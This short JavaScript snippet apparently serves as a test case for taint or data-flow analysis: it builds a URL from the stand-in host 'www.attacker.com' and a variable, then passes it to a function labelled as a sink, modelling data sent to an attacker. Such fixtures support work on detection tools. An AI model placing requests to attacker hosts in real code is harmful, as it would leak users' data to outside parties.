var i =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);


if (h > 5) {var l  = 1;} 

url = urll("www.attacker.com" + l);
sink('Sink', '', url);

